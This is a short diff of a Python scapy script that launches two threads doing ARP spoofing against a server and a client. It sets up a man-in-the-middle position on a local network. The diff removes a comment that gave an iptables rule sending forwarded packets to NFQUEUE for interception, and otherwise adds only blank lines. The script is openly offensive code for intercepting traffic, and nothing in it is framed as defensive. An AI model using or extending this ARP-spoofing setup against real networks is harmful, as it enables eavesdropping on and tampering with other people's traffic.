@@ -1,6 +1,5 @@
 from scapy.all import *
 import threading
-# iptables设置规则iptables -A FORWARD -j NFQUEUE --queue-num 0
 
 
 def arp_spoof(hwdst: str, pdst: str, hwsrc: str, psrc: str, inter: int = 0.1) -> None:
@@ -41,6 +40,7 @@ server_arp_spoof_thread = threading.Thread(
         0.1
     )
 )
+
 client_arp_spoof_thread = threading.Thread(
     target=arp_spoof,
     args=(
@@ -51,5 +51,6 @@ client_arp_spoof_thread = threading.Thread(
         0.1
     )
 )
+
 server_arp_spoof_thread.start()
 client_arp_spoof_thread.start()
